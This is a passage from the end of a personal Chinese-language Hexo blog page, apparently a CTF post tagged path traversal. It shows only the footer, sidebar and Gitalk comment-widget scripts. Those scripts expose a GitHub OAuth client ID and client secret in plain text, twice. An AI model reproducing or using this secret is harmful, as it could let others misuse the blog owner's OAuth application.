    owner: &apos;MR-eggegg&apos;,
    admin: [&apos;MR-eggegg&apos;],
    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,

});
gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/" rel="tag"># 路径穿越</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2020/01/04/ctf-web-wtf-sh-150/" rel="prev" title="ctf-web-wtf.sh-150">
      <i class="fa fa-chevron-left"></i> ctf-web-wtf.sh-150
    </a></div>
      <div class="post-nav-item"></div>
    </div>
      </footer>
    
  </article>
  
  
  

  </div>


          </div>
          
    <div class="comments" id="gitalk-container"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="egg"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">egg</p>
  <div class="site-description" itemprop="description">kobo</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">11</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">2</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">20</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">egg</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.6.0
  </div>

        








      </div>
    </footer>
  </div>

  
  
  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>

<script src="/js/utils.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>















<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID: 'dcf239aa6b46fcf244a3',
      clientSecret: '2b92cc0f958358e2c10b5fb8746381c15f5ee29d',
      repo: 'MR-eggegg.github.io',
      owner: 'MR-eggegg',
      admin: ['MR-eggegg'],
      id: 'a676607444a8bc8b150c9a3aff884e61',
        language: '',
      distractionFreeMode: 'true'
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>



.gt-container a{border-bottom: none;}

  

  

<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">

<script>
NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js', () => {
    var gitalk = new Gitalk({
      clientID: 'dcf239aa6b46fcf244a3',
      clientSecret: '2b92cc0f958358e2c10b5fb8746381c15f5ee29d',
      repo: 'MR-eggegg.github.io',
      owner: 'MR-eggegg',
      admin: ['MR-eggegg'],
      id: 'b35855fcae02ae26699ac0f3e02c2535',
        language: '',
      distractionFreeMode: 'true'
    });
    gitalk.render('gitalk-container');
  }, window.Gitalk);
});
</script>

</body>
</html>
